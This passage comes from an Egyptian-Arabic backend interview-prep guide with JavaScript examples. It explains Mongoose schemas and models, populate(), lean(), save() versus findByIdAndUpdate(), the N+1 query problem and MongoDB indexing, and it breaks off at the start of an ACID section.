**الـ Schema** هو المخطط. إنت بتجلس مع الـ Architect وبتقوله: "عايز غرفة نوم بـ 4x4 متر، صالة بـ 6x5 متر، مطبخ." ده التعريف — لا يزال على الورق، مفيش بناء حصل.

في Mongoose، الـ Schema بيعرّف:
- أسماء الـ Fields وأنواعها
- الـ Validation Rules (Required, Min, Max, Enum)
- القيم الافتراضية (Defaults)
- الـ Virtual Fields (Fields محسوبة مش بتتخزّن في الـ DB)
- الـ Indexes
- الـ Pre/Post Hooks (Middleware على مستوى الـ Document)
- الـ Instance Methods والـ Static Methods

**الـ Model** هو البيت الفعلي المبني. هو الـ Class اللي بتشتغل معاه في الكود. لما بتعمل `mongoose.model('User', userSchema)`، ده زي إنك بتبني البيت من المخطط. بعدها بتستخدم الـ Model (البيت) عشان:
- تنشئ Documents جديدة: `new User({...})` أو `User.create({...})`
- تعمل Queries: `User.find()`, `User.findById()`, `User.findOne()`
- تعمل Updates: `User.findByIdAndUpdate()`
- تعمل Deletes: `User.findByIdAndDelete()`

**اسم الـ Model مهم:** لما بتعمل `mongoose.model('User', userSchema)`، Mongoose بيتوقع إن الـ Collection في MongoDB اسمها `users` (بيحوّل الاسم لـ Lowercase ويضيف 's'). لو عايز اسم مختلف، بتضيفه كـ Parameter تالت: `mongoose.model('User', userSchema, 'my_users_collection')`.

---

#### 💻 الكود

```javascript
const mongoose = require("mongoose");

// ============================================================
// SCHEMA DEFINITION — The Blueprint
// ============================================================

const userSchema = new mongoose.Schema(
  {
    // --- Basic Field Types ---
    name: {
      type: String,
      required: [true, "Name is required"],       // Validation with custom message
      trim: true,                                 // Auto-strip whitespace
      minlength: [2, "Name must be at least 2 characters"],
      maxlength: [50, "Name cannot exceed 50 characters"],
    },
    email: {
      type: String,
      required: [true, "Email is required"],
      unique: true,                               // Creates a unique index in MongoDB
      lowercase: true,                            // Auto-convert to lowercase before saving
      match: [/^\S+@\S+\.\S+$/, "Invalid email format"],
    },
    passwordHash: {
      type: String,
      required: true,
      select: false,  // NEVER returned in queries by default — must explicitly request it
    },
    role: {
      type: String,
      enum: {
        values: ["user", "admin", "moderator"],   // Only these values allowed
        message: "Role must be user, admin, or moderator",
      },
      default: "user",                            // Default value if not provided
    },
    age: {
      type: Number,
      min: [18, "Must be at least 18 years old"],
      max: [120, "Age seems unrealistic"],
    },
    isVerified: { type: Boolean, default: false },
    profilePicture: { type: String, default: null },

    // --- Nested Object ---
    address: {
      street: { type: String },
      city:   { type: String },
      country: { type: String, default: "Egypt" },
    },

    // --- Array of Strings ---
    skills: [{ type: String, trim: true }],

    // --- Reference to another collection (for .populate()) ---
    department: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "Department",  // The model name to populate from
    },
  },
  {
    // Schema-level options
    timestamps: true,    // Auto-add createdAt and updatedAt fields — managed by Mongoose
    versionKey: false,   // Disable the __v field that Mongoose adds by default
  }
);

// ============================================================
// VIRTUAL FIELD — computed property, NOT stored in the database
// ============================================================

userSchema.virtual("fullDisplayName").get(function () {
  // Arrow functions don't work here — we need 'this' to refer to the document
  return `${this.name} (${this.role})`; // e.g., "Ahmed Hassan (admin)"
});

// ============================================================
// PRE-SAVE HOOK — Middleware that runs BEFORE a document is saved
// ============================================================

userSchema.pre("save", async function (next) {
  // 'this' refers to the document being saved
  if (!this.isModified("passwordHash")) return next(); // Only hash if password actually changed

  const bcrypt = require("bcrypt");
  this.passwordHash = await bcrypt.hash(this.passwordHash, 12);
  next();
});

// ============================================================
// INSTANCE METHOD — available on individual document instances
// ============================================================

userSchema.methods.verifyPassword = async function (candidatePassword) {
  const bcrypt = require("bcrypt");
  // 'this.passwordHash' might not be loaded (select: false), so we need to include it explicitly
  return bcrypt.compare(candidatePassword, this.passwordHash);
};

// ============================================================
// STATIC METHOD — available on the Model itself, not instances
// ============================================================

userSchema.statics.findByEmail = function (email) {
  // 'this' here refers to the Model — not a document instance
  return this.findOne({ email: email.toLowerCase() });
};

// ============================================================
// INDEX DEFINITION
// ============================================================

userSchema.index({ role: 1, isVerified: 1 }); // Compound index for filtering by role + verification status
userSchema.index({ createdAt: -1 });            // Index for sorting by newest first

// ============================================================
// CREATE THE MODEL — The House Built from the Blueprint
// ============================================================

// "User" → Mongoose will automatically use "users" as the collection name
const User = mongoose.model("User", userSchema);

// ============================================================
// USING THE MODEL
// ============================================================

async function examples() {
  // Creating a new document
  const user = await User.create({
    name: "Ahmed Hassan",
    email: "ahmed@example.com",
    passwordHash: "plainTextPass123", // pre-save hook will hash this automatically
    role: "admin",
    age: 28,
    skills: ["Node.js", "MongoDB", "Express"],
    address: { street: "123 Nile St", city: "Cairo" },
  });

  // Using the static method
  const foundUser = await User.findByEmail("AHMED@EXAMPLE.COM"); // Auto-lowercased

  // Using the instance method (need to select passwordHash explicitly)
  const userWithPass = await User.findById(user._id).select("+passwordHash");
  const isValid = await userWithPass.verifyPassword("plainTextPass123"); // true

  // Accessing the virtual field
  console.log(user.fullDisplayName); // "Ahmed Hassan (admin)"
}
```

**[⬆ Back to Top](#)**

---

### 9. إيه هو `populate()` في Mongoose وكيف بيشتغل من تحت؟

---

#### 🧠 الشرح

قبل ما أشرح `populate()`، لازم نتفق على مشكلة.

في MongoDB، مش بيبقى عندك "Foreign Keys" زي SQL. لو عايز تعمل Relationship بين Collection المستخدمين وCollection المقالات، بتخزّن الـ `ObjectId` بتاع الـ User جوه الـ Post Document. ده بيتسمى **Referencing** أو **Normalization**.

```
Post Document in DB:
{
  _id: ObjectId("post123"),
  title: "My Article",
  author: ObjectId("user456")   ← just the ID, not the full user data
}
```

دلوقتي لو عايز تعرض الـ Post مع اسم الكاتب واميله، بتعمل إيه؟ هتعمل Query على الـ Post تاني على الـ User بالـ ID ده. ده شغال بس محتاج Query تانية.

**`populate()` بيعمل ده تلقائياً.** بيشوف الـ `ObjectId`، بيروح يجيب الـ Document المقابل من الـ Collection التانية، وبيحط الـ Data الكاملة مكان الـ ID.

**تحت الغطاء:** `populate()` بيشغّل فعلاً Query تانية — بتستخدم `$in` Operator. يعني لو جبت 100 Post، Mongoose بيعمل `User.find({ _id: { $in: [id1, id2, ...] } })` Query واحدة بكل الـ IDs مش 100 Query. ده أذكى بكتير من عمل Loop وجيب كل User على حدة.

**متى تستخدم `populate()` ومتى لا؟**

استخدمه لما:
- الـ Data المرتبطة مش كبيرة الحجم
- بتحتاج الـ Data دي مع كل Request تقريباً
- مش عندك Millions من الـ Documents

ابعد عنه لما:
- عندك آلاف أو ملايين من الـ Documents وكل واحد محتاج populate من تاني (الـ N+1 Problem — هنشرحه)
- ممكن تخزّن البيانات الضرورية مع الـ Document نفسه (Embedding) بدل الـ Referencing

---

#### 💻 الكود

```javascript
const mongoose = require("mongoose");

// ============================================================
// SCHEMA SETUP — Two related models: Author and Book
// ============================================================

const authorSchema = new mongoose.Schema({
  name:      { type: String, required: true },
  email:     { type: String, required: true },
  bio:       { type: String },
  country:   { type: String, default: "Egypt" },
});

const bookSchema = new mongoose.Schema({
  title:       { type: String, required: true },
  isbn:        { type: String, unique: true },
  publishedAt: { type: Date },
  price:       { type: Number },
  // Reference to Author — stores only the ObjectId in MongoDB
  author: {
    type:     mongoose.Schema.Types.ObjectId,
    ref:      "Author",  // The model name — Mongoose uses this for populate()
    required: true,
  },
  // Array of references
  reviewers: [{ type: mongoose.Schema.Types.ObjectId, ref: "User" }],
  // Nested reference inside an array of objects
  chapters: [{
    title:  { type: String },
    editor: { type: mongoose.Schema.Types.ObjectId, ref: "User" },
  }],
});

const Author = mongoose.model("Author", authorSchema);
const Book   = mongoose.model("Book",   bookSchema);

// ============================================================
// POPULATE — Fetching with related data
// ============================================================

async function populateExamples() {

  // --- Basic populate: replace author ObjectId with full Author document ---
  const book = await Book.findById("some-book-id").populate("author");
  // book.author is now: { name: "Naguib Mahfouz", email: "nm@eg.com", country: "Egypt" }
  // NOT: ObjectId("some-author-id")

  // --- Selective populate: only fetch specific fields from the author ---
  const bookWithPartialAuthor = await Book.findById("some-book-id").populate(
    "author",
    "name country -_id" // Include: name, country. Exclude: _id (using the minus sign)
  );
  // book.author is now: { name: "Naguib Mahfouz", country: "Egypt" }

  // --- Multiple populate: populate author AND reviewers in one query ---
  const bookFull = await Book.findById("some-book-id")
    .populate("author", "name email")
    .populate("reviewers", "name");

  // --- Populate with a query filter: only populate author if they are from Egypt ---
  const bookFiltered = await Book.findById("some-book-id").populate({
    path:   "author",
    match:  { country: "Egypt" }, // Only populate if author matches this condition
    select: "name email",
    // If author doesn't match, book.author will be null (not an error)
  });

  // --- Nested populate: populate editor inside each chapter ---
  const bookWithEditors = await Book.findById("some-book-id").populate({
    path:    "chapters.editor", // Nested path
    select:  "name",
  });

  // --- Deep populate (populate a reference inside a populated document) ---
  // Example: Book → Author → (Author's publisher, which is another collection)
  const bookDeep = await Book.findById("some-book-id").populate({
    path:     "author",
    select:   "name publisher",
    populate: {                    // Deep populate: populate within the populated author
      path:   "publisher",
      select: "name address",
    },
  });

  // --- Populating arrays: get all books with their authors ---
  const allBooks = await Book.find({}).populate("author", "name").lean();
  // Mongoose runs: Author.find({ _id: { $in: [all unique author IDs] } })
  // ONE extra query for ALL authors combined — not N queries
}
```

**[⬆ Back to Top](#)**

---

### 10. إيه الفرق بين `.lean()` والـ Regular Mongoose Query وإمتى بنستخدم كل واحد؟

---

#### 🧠 الشرح

لما بتعمل Query عادية في Mongoose، اللي بيرجعلك مش مجرد JavaScript Object عادي. ده **Mongoose Document** — وده Object ضخم فيه:
- كل الـ Data بتاعتك
- Reference للـ Schema
- الـ Instance Methods اللي عرّفتها
- الـ Virtual Fields
- الـ Internal State Tracking (عشان يعرف إيه اللي اتغير لما تعمل `.save()`)
- الـ Getters والـ Setters
- الـ `__v` و `_id` management
- وحاجات تانية كتير

كل ده بياخد **Memory** وبياخد **Processing Time** لتكوينه.

**`.lean()`** بيقول لـ Mongoose: "ارمي كل ده. رجّعلي Plain JavaScript Object بسيط وبس." الـ Object الراجع هو بالضبط اللي في الـ Database — مش أكتر ومش أقل.

**متى تستخدم كل واحد؟**

**استخدم الـ Regular Query (بدون `.lean()`) لما:**
- هتعمل تعديل على الـ Document وتعمل `.save()` بعدين
- محتاج الـ Pre/Post Save Hooks تشتغل
- محتاج تستخدم Instance Methods زي `user.verifyPassword()`
- محتاج الـ Virtual Fields تظهر في الـ Result

**استخدم `.lean()` لما:**
- هترد بالـ Data للـ Client مباشرة كـ API Response (Read-only)
- بتعمل حسابات أو Analytics على Data كبيرة
- بتعمل Export لبيانات
- الـ Performance مهم وأنت عارف إنك مش هتحتاج Mongoose methods

الفرق في الـ Performance ممكن يكون كبير — في بعض الحالات `.lean()` أسرع بـ 3-5 مرات وبيستخدم ذاكرة أقل بكتير، خصوصاً لما بتجيب كميات كبيرة من الـ Documents.

---

#### 💻 الكود

```javascript
const mongoose = require("mongoose");

// ============================================================
// LEAN vs Regular Query — Understanding the Difference
// ============================================================

// Without .lean() — returns full Mongoose Documents
async function regularQuery() {
  const users = await User.find({ role: "admin" });

  // users[0] is a Mongoose Document:
  console.log(users[0] instanceof mongoose.Document); // true
  console.log(typeof users[0].save);    // "function" — Mongoose method exists
  console.log(typeof users[0].toJSON);  // "function" — Mongoose method exists

  // You CAN call Mongoose methods on it
  users[0].name = "Updated Name";
  await users[0].save(); // Works — pre-save hooks run, validation runs

  return users;
}

// With .lean() — returns plain JavaScript Objects
async function leanQuery() {
  const users = await User.find({ role: "admin" }).lean();

  // users[0] is a plain JavaScript object:
  console.log(users[0] instanceof mongoose.Document); // false
  console.log(typeof users[0].save);    // "undefined" — no Mongoose methods!
  console.log(typeof users[0].toJSON);  // "undefined"

  // users[0] is literally: { _id: ObjectId(...), name: "Ahmed", role: "admin" }
  // Much lighter, much faster to work with

  return users;
}

// ============================================================
// PRACTICAL PATTERNS: When to use each
// ============================================================

// --- PATTERN 1: API Response endpoint — use .lean() ---
app.get("/api/v1/products", async (req, res, next) => {
  try {
    const { page = 1, limit = 20, category } = req.query;
    const filter = category ? { category } : {};

    const products = await Product
      .find(filter)
      .select("name price category imageUrl -_id") // Only send needed fields
      .sort({ createdAt: -1 })
      .skip((page - 1) * limit)
      .limit(Number(limit))
      .lean(); // No Mongoose Document overhead — we're just sending JSON

    res.json({ success: true, count: products.length, data: products });
  } catch (err) {
    next(err);
  }
});

// --- PATTERN 2: Updating a document — use regular query with .save() ---
app.patch("/api/v1/users/:id/verify-email", async (req, res, next) => {
  try {
    // We NEED a Mongoose Document here because we want hooks to run
    const user = await User.findById(req.params.id); // NO .lean()

    if (!user) return res.status(404).json({ error: "User not found" });

    user.isVerified = true;
    user.verifiedAt = new Date();
    // .save() triggers pre-save hooks (e.g., audit logging, email notification)
    await user.save();

    res.json({ success: true, message: "Email verified successfully" });
  } catch (err) {
    next(err);
  }
});

// --- PATTERN 3: Heavy data processing or export — definitely use .lean() ---
async function generateMonthlyReport() {
  // Processing thousands of records — .lean() saves significant memory
  const allOrders = await Order
    .find({ createdAt: { $gte: new Date("2024-01-01") } })
    .populate("product", "name category price") // Can combine .lean() with .populate()
    .lean(); // Even after populate, results are plain objects

  // Now process the plain objects — fast and memory-efficient
  const totalRevenue = allOrders.reduce((sum, order) => sum + order.totalPrice, 0);
  const byCategory   = allOrders.reduce((acc, order) => {
    const cat = order.product?.category || "uncategorized";
    acc[cat]  = (acc[cat] || 0) + order.totalPrice;
    return acc;
  }, {});

  return { totalRevenue, byCategory, orderCount: allOrders.length };
}
```

**[⬆ Back to Top](#)**

---

### 11. إيه الفرق بين `save()` و `findByIdAndUpdate()` وإمتى تستخدم كل واحد؟

---

#### 🧠 الشرح

الفرق بين الاتنين مش بس في الـ Syntax — ده فرق في الـ Philosophy والـ Behavior.

**طريقة `.save()`:**
الـ Flow هنا بيمر بمراحل:
1. بتجيب الـ Document من الـ Database (Query أولى)
2. بتعدّل الـ Properties عليه في الـ Memory
3. بتستدعي `.save()` اللي بتعمل Query تانية للـ Database

ده بيعني الـ Document بيمر بالـ **Mongoose Lifecycle** الكامل:
- الـ Schema Validators بيشتغلوا
- الـ Pre-Save Hooks بتشتغل (زي الـ Password Hashing، الـ Audit Logging)
- الـ Post-Save Hooks بتشتغل
- الـ `isModified()` tracking بيشتغل (تعرف أي Fields اتغيرت)

**طريقة `findByIdAndUpdate()`:**
بتعمل Update مباشرة في الـ Database في Query واحدة فقط. ده أسرع. بس الـ Default Behavior هو إنه يتجاوز كل الـ Mongoose Lifecycle:
- الـ Validators مش بيشتغلوا (إلا لو حددت `runValidators: true`)
- الـ Pre-Save Hooks مش بتشتغل
- الـ Instance Methods مش متاحة

**متى تستخدم إيه؟**

**استخدم `.save()` لما:**
- عندك Pre-Save Hook مهم (Password Hashing هو المثال الكلاسيكي)
- الـ Validation مهمة وعايزها تشتغل
- محتاج تعرف إيه اللي اتغير بـ `isModified()`
- عملية Business Logic معقدة

**استخدم `findByIdAndUpdate()` لما:**
- تحديثات بسيطة وسريعة
- Counter increments, status changes
- Performance حساسة وعارف إن الـ Validation مش محتاجها
- عملية Atomic — مش عايزها تتأثر بـ Race Condition (شخصين بيعدّلوا نفس الـ Document)

**Race Condition - الـ Problem الخفي مع `.save()`:**

تخيّل إن UserA وUserB بيعدّلوا نفس الـ Document في نفس الوقت:
- UserA جاب الـ Document من الـ DB
- UserB جاب الـ Document من الـ DB (نفس الـ Version)
- UserA عدّل وعمل `.save()` — النجاح
- UserB عدّل وعمل `.save()` — كتب فوق تغييرات UserA!

`findByIdAndUpdate()` Atomic — الـ Update كله بيحصل في خطوة واحدة في MongoDB، فمفيش Race Condition.

---

#### 💻 الكود

```javascript
const mongoose = require("mongoose");

// ============================================================
// .save() — Full Mongoose lifecycle, two DB queries
// ============================================================

async function updateUserWithSave(userId, newEmail) {
  // Query 1: Fetch the document from MongoDB
  const user = await User.findById(userId);

  if (!user) throw new AppError("User not found", 404);

  // Check what changed (Mongoose tracks this automatically)
  console.log("Was email modified before?", user.isModified("email")); // false

  // Modify the document in memory
  user.email     = newEmail;
  user.updatedAt = new Date();

  console.log("Is email modified now?", user.isModified("email")); // true
  console.log("Modified fields:", user.modifiedPaths()); // ["email", "updatedAt"]

  // Query 2: Save back to MongoDB
  // This triggers: validation + pre-save hooks + the actual DB write + post-save hooks
  const savedUser = await user.save();
  return savedUser;
}

// Pre-save hook — this ONLY runs with .save(), NOT with findByIdAndUpdate()
userSchema.pre("save", function (next) {
  if (this.isModified("email")) {
    // Send a verification email when email changes
    sendVerificationEmail(this.email);
    this.isVerified = false; // Reset verification status
  }
  next();
});

// ============================================================
// findByIdAndUpdate() — Single atomic DB operation, much faster
// ============================================================

async function updateUserWithFindAndUpdate(userId, updateData) {
  const updatedUser = await User.findByIdAndUpdate(
    userId,                     // The document to find
    { $set: updateData },       // The update operation ($set: update specific fields only)
    {
      new: true,               // IMPORTANT: return the NEW document, not the old one
      runValidators: true,     // Opt-in: run schema validators on the updated fields
      // Note: even with runValidators: true, pre-save hooks still DON'T run
    }
  );

  if (!updatedUser) throw new AppError("User not found", 404);
  return updatedUser;
}

// ============================================================
// MongoDB Update Operators — essential knowledge
// ============================================================

async function mongoUpdateOperators(userId) {

  // $set — update specific fields (leave others untouched)
  await User.findByIdAndUpdate(userId, {
    $set: { name: "New Name", "address.city": "Alexandria" }
  }, { new: true });

  // $unset — remove a field completely from the document
  await User.findByIdAndUpdate(userId, {
    $unset: { temporaryCode: "" } // The value doesn't matter — just removes the field
  });

  // $inc — atomically increment or decrement a number (safe for counters)
  await Product.findByIdAndUpdate(productId, {
    $inc: { viewCount: 1, stock: -1 } // Increment views, decrement stock
  });

  // $push — add an element to an array
  await User.findByIdAndUpdate(userId, {
    $push: { skills: "Docker" }
  });

  // $addToSet — add to array ONLY if it doesn't already exist (prevents duplicates)
  await User.findByIdAndUpdate(userId, {
    $addToSet: { skills: "Node.js" } // Won't add if "Node.js" already exists
  });

  // $pull — remove a specific element from an array
  await User.findByIdAndUpdate(userId, {
    $pull: { skills: "PHP" } // Removes "PHP" from the skills array
  });

  // $push with $each and $slice — add multiple items and keep array bounded
  await User.findByIdAndUpdate(userId, {
    $push: {
      activityLog: {
        $each:  [{ action: "login", at: new Date() }], // Add these items
        $slice: -100, // Keep only the last 100 entries — prevent unbounded growth
        $sort:  { at: -1 }, // Sort by date descending before slicing
      }
    }
  });
}
```

**[⬆ Back to Top](#)**

---

## 🗄️ Part 3 — Database Concepts & Famous Problems

---

### 12. إيه هو الـ N+1 Problem وليه بيدمّر الـ Performance؟

---

#### 🧠 الشرح

الـ N+1 Problem هو واحد من أكتر مشاكل الـ Performance شيوعاً في الـ Backend Development. الاسم غريب شوية، بس لما تفهمه هتعرف تعرّفه بسرعة في الإنترفيو.

**القصة بالبسيط:**

تخيّل معايا إنك بتشغّل متجر إلكتروني وعايز تعمل صفحة بتعرض آخر 50 Order مع اسم الـ Customer اللي عمل كل Order.

الـ Developer اللي ما عنيش فكّر في المشكلة دي هيعمل:

1. **Query 1:** "جيب لي آخر 50 Order" — بيجيب 50 Document، كل واحد فيه `customerId`
2. **Loop** على الـ 50 Order: "جيب Customer بالـ ID ده"
   - Query 2: جيب Customer بـ ID الـ Order الأول
   - Query 3: جيب Customer بـ ID الـ Order التاني
   - Query 4: جيب Customer بـ ID الـ Order التالت
   - ...
   - Query 51: جيب Customer بـ ID الـ Order التمانين والعشرين

يعني عمل **1 (للـ Orders) + 50 (للـ Customers) = 51 Query** عشان يعمل حاجة بسيطة. لو عندك 1000 Order، بتعمل 1001 Query. لو عندك 10,000 Order، بتعمل 10,001 Query!

كل Query بتاخد وقت — يقولها 10ms مثلاً. 51 Query = 510ms تأخير. 1001 Query = 10 ثانية تأخير! وده بيعمل Load رهيب على الـ Database.

**ليه بتحصل؟**

لأن الـ Developer بيفكر في الـ Code Logic من غير ما يفكر في الـ Database Queries اللي بتتولّد. كل سطر `await User.findById(order.customerId)` بيعمل Database Call منفصلة.

**الحلول:**

**الحل 1: استخدام `populate()` في Mongoose**
Mongoose هيعمل Query واحدة بس للـ Users بـ `$in` Operator — يجيب كل الـ Users المطلوبين في طلب واحد.

**الحل 2: الـ Batch Fetch اليدوي**
تجمع كل الـ IDs المطلوبة وتعمل Query واحدة بـ `{ _id: { $in: ids } }`.

**الحل 3: إعادة تصميم الـ Schema (Embedding)**
لو الـ Data اللي بتحتاجها عن الـ Customer صغيرة (اسمه، إيميله بس)، ممكن تخزّنها مدموجة في الـ Order Document نفسه بدل الـ Reference.

**الحل 4: MongoDB Aggregation Pipeline بـ `$lookup`**
بتعمل الـ Join في الـ Database نفسها في Query واحدة.

---

#### 💻 الكود

```javascript
// ============================================================
// THE N+1 PROBLEM — A Real-World Scenario
// ============================================================

// We have two collections: orders and customers
// Each order has a customerId referencing the customers collection

// ❌ PROBLEM: N+1 — This creates 1 + N database queries
async function getOrdersWithCustomersBad() {
  const orders = await Order.find({}).limit(50).lean(); // Query 1: get 50 orders

  // For each of the 50 orders, we make a separate database call — TERRIBLE!
  const enrichedOrders = [];
  for (const order of orders) {
    // This is the +N part: 50 separate queries, each waiting for the previous
    const customer = await Customer.findById(order.customerId).lean(); // Queries 2-51!
    enrichedOrders.push({ ...order, customer });
  }

  return enrichedOrders;
  // Total: 51 queries, each taking ~10ms = ~510ms minimum
  // This is a performance disaster at scale
}

// ✅ SOLUTION 1: Mongoose .populate() — 2 queries total
async function getOrdersWithCustomersGood_Populate() {
  // Mongoose internally does: Customer.find({ _id: { $in: [all customer IDs] } })
  const orders = await Order.find({})
    .limit(50)
    .populate("customerId", "name email phone") // Only fetch needed fields
    .lean();

  return orders;
  // Total: 2 queries — vastly better!
}

// ✅ SOLUTION 2: Manual batch fetch — maximum control
async function getOrdersWithCustomersGood_BatchFetch() {
  // Step 1: Get all orders (1 query)
  const orders = await Order.find({}).limit(50).lean();

  // Step 2: Extract all unique customer IDs
  const customerIds = [...new Set(orders.map((o) => o.customerId.toString()))];

  // Step 3: Fetch ALL needed customers in ONE query using $in
  const customers = await Customer.find({ _id: { $in: customerIds } })
    .select("name email phone")
    .lean(); // 1 query for ALL customers

  // Step 4: Create a lookup map for O(1) access — no nested loops
  const customerMap = customers.reduce((map, customer) => {
    map[customer._id.toString()] = customer;
    return map;
  }, {});

  // Step 5: Merge orders with customer data in memory — no more DB calls
  return orders.map((order) => ({
    ...order,
    customer: customerMap[order.customerId.toString()],
  }));
  // Total: 2 queries, regardless of how many orders there are
}

// ✅ SOLUTION 3: MongoDB Aggregation Pipeline $lookup — single query, most efficient
async function getOrdersWithCustomersGood_Aggregation() {
  const orders = await Order.aggregate([
    { $limit: 50 },
    {
      $lookup: {
        from:         "customers",  // The collection name (not model name!)
        localField:   "customerId", // Field in the orders collection
        foreignField: "_id",        // Field in the customers collection
        as:           "customer",   // The output field name
        pipeline: [                 // Optional: only fetch specific customer fields
          { $project: { name: 1, email: 1, phone: 1 } },
        ],
      },
    },
    {
      $unwind: {
        path:                       "$customer",
        preserveNullAndEmptyArrays: true, // Keep order even if customer is missing
      },
    },
  ]);

  return orders;
  // Total: 1 query — the database does the join internally (most efficient for large datasets)
}

// ============================================================
// PERFORMANCE COMPARISON (approximate, varies by setup)
// ============================================================

// For 50 orders:
// N+1 approach:        ~500ms   (50 round trips to DB)
// populate() approach: ~25ms    (2 round trips to DB)
// batch fetch:         ~20ms    (2 round trips to DB, controlled)
// aggregation:         ~15ms    (1 round trip to DB)

// For 1000 orders:
// N+1 approach:        ~10,000ms  (10 SECONDS!)
// All other solutions: ~50-100ms  (50-100 milliseconds)
```

**[⬆ Back to Top](#)**

---

### 13. إيه هو الـ Indexing في MongoDB وإزاي بيحسّن الـ Performance؟

---

#### 🧠 الشرح

تخيّل إن عندك كتاب بـ 1000 صفحة وعايز تلاقي كل المرات اللي اتذكر فيها اسم "القاهرة". عندك خيارين:

**الخيار الأول:** تقلّب كل صفحة من الأول للآخر. ده بيتسمى **Full Table Scan (COLLSCAN)** — بطيء ومؤلم. في Database فيها مليون Document، MongoDB هيحتاج يقرأ المليون Document كلهم عشان يلاقي اللي إنت عايزه.

**الخيار التاني:** تبص على فهرس الكتاب في الآخر — هتلاقي "القاهرة: صفحات 45، 127، 389، 756." مباشرة بتروح للصفحات دي. ده بالظبط الـ **Index** في قاعدة البيانات.

الـ Index في MongoDB هو **Data Structure منفصلة** (B-Tree) بيحتفظ فيها بقيم الـ Field اللي عملت عليه Index مرتبة، مع Pointer لكل Document. لما بتعمل Query، MongoDB بيبص على الـ Index أولاً، بيلاقي الـ Pointer للـ Document المطلوب، وبيروح عليه مباشرة.

**أنواع الـ Indexes:**

**1. Single Field Index:**
الأبسط — Index على Field واحد. مفيد للـ Queries اللي بتفلتر بـ Field واحد.

**2. Compound Index:**
Index على أكتر من Field. مفيد جداً لـ Queries بتفلتر بعدة Fields مع بعض. ترتيب الـ Fields في الـ Compound Index مهم جداً — هيتكلم عنه.

**3. Unique Index:**
بيضمن إن كل قيمة في الـ Field فريدة. الـ `unique: true` في الـ Schema بيعمل ده تلقائياً.

**4. Text Index:**
للـ Full-Text Search. بيعمل Index على محتوى النصوص عشان تقدر تعمل بحث في النصوص.

**5. TTL Index (Time-To-Live):**
بيحذف الـ Documents تلقائياً بعد فترة معينة. مفيد جداً للـ Sessions أو الـ Temporary Data أو الـ Logs.

**6. Sparse Index:**
بيعمل Index بس على الـ Documents اللي فيها الـ Field ده. لو الـ Field اختياري ومش موجود في كل الـ Documents، Sparse Index أصغر وأسرع.

**الـ Cost of Indexes:**
الـ Indexes مجانية على الـ Read — بيسرّعوها. بس ليهم Cost على الـ Write. كل مرة بتعمل Insert, Update, أو Delete، MongoDB لازم يحدّث الـ Index برضو. يعني لو عندك 10 Indexes على Collection، كل Write Operation بتعمل 11 عملية فعلياً (الـ Document نفسه + الـ 10 Indexes). لذلك مش المفروض تعمل Index على كل Field — بس على الـ Fields اللي بتستخدمها في الـ Queries كتير.

**الـ ESR Rule للـ Compound Indexes:**
فيه Rule مشهورة اسمها ESR:
- **E**quality fields first (الـ Fields اللي بتعمل عليها `$eq` أو exact match)
- **S**ort fields second (الـ Fields اللي بتعمل عليها `sort()`)
- **R**ange fields last (الـ Fields اللي بتعمل عليها `$gt`, `$lt`, `$gte`, `$in`)

---

#### 💻 الكود

```javascript
const mongoose = require("mongoose");

// ============================================================
// DEFINING INDEXES IN MONGOOSE SCHEMA
// ============================================================

const productSchema = new mongoose.Schema({
  name:      { type: String, required: true },
  category:  { type: String, required: true },
  price:     { type: Number, required: true },
  brand:     { type: String },
  stock:     { type: Number, default: 0 },
  isActive:  { type: Boolean, default: true },
  createdAt: { type: Date, default: Date.now },
  expiresAt: { type: Date }, // Used for TTL index
  tags:      [String],
  description: { type: String },
});

// --- Single Field Indexes ---
productSchema.index({ category: 1 });             // Ascending index on category
productSchema.index({ price: -1 });               // Descending index on price (for "sort by price desc")
productSchema.index({ name: 1 }, { unique: true }); // Unique index — no duplicate product names

// --- Compound Index (ESR Rule applied) ---
// Common query: "find active products in a category, sorted by price, in a price range"
// db.products.find({ isActive: true, category: "electronics", price: { $gte: 100, $lte: 1000 } }).sort({ price: 1 })
productSchema.index({
  isActive:  1,  // E — Equality field first
  category:  1,  // E — Equality field second
  price:     1,  // S + R — Sort AND range field (same field in this case)
});

// --- Text Index — for full-text search ---
productSchema.index(
  { name: "text", description: "text", tags: "text" }, // Fields to search in
  { weights: { name: 10, tags: 5, description: 1 } }   // Name matches are 10x more relevant
);

// --- TTL Index — automatically delete expired documents ---
productSchema.index(
  { expiresAt: 1 },
  { expireAfterSeconds: 0 } // 0 means: delete when the current time passes the expiresAt value
);

// --- Sparse Index — only index documents that have this field ---
productSchema.index({ brand: 1 }, { sparse: true }); // Don't index products without a brand field

const Product = mongoose.model("Product", productSchema);

// ============================================================
// QUERYING WITH INDEXES — and how to verify they're being used
// ============================================================

async function indexedQueries() {

  // This query uses the compound index (isActive + category + price)
  const electronics = await Product.find({
    isActive:  true,
    category:  "electronics",
    price:     { $gte: 100, $lte: 1000 },
  }).sort({ price: 1 }).lean();

  // Full-text search using the text index
  const searchResults = await Product.find(
    { $text: { $search: "laptop gaming" } },          // Search in indexed text fields
    { score: { $meta: "textScore" } }                 // Include relevance score
  ).sort({ score: { $meta: "textScore" } });          // Sort by relevance

  // --- Checking if MongoDB uses an index (EXPLAIN) ---
  // In MongoDB shell: db.products.find({category:"electronics"}).explain("executionStats")
  // In Mongoose:
  const explanation = await Product.find({ category: "electronics" }).explain("executionStats");
  // Look for: winningPlan.stage
  // "IXSCAN"   → Great! MongoDB used an index
  // "COLLSCAN" → Bad!  MongoDB scanned the whole collection — add an index!
  console.log("Query plan:", explanation.queryPlanner.winningPlan.stage);
}

// ============================================================
// CREATING INDEXES PROGRAMMATICALLY (outside schema definition)
// ============================================================

async function createIndexManually() {
  // Create a compound index directly on the collection
  await mongoose.connection.collection("products").createIndex(
    { category: 1, createdAt: -1 }, // Index definition
    { background: true, name: "idx_category_date" } // Options
  );

  // List all indexes on a collection
  const indexes = await mongoose.connection.collection("products").indexes();
  console.log("Current indexes:", indexes.map((i) => i.name));

  // Drop a specific index (useful if you created a wrong one)
  await mongoose.connection.collection("products").dropIndex("idx_category_date");
}
```

**[⬆ Back to Top](#)**

---

### 14. إيه هي ACID Properties وإيه هو BASE؟ وإيه الـ CAP Theorem ببساطة؟

---

#### 🧠 الشرح

دي من أهم الـ Theoretical Concepts في الـ Backend. بتيجي في كل إنترفيو فيه Database Component.

**ACID — الـ SQL World:**

تخيّل إنك بتعمل تحويل بنكي — بتنقل 1000 جنيه من حسابك لحساب صديقك.

العملية دي فيها خطوتين:
1. خصم 1000 جنيه من حسابك
2. إضافة 1000 جنيه لحساب صديقك

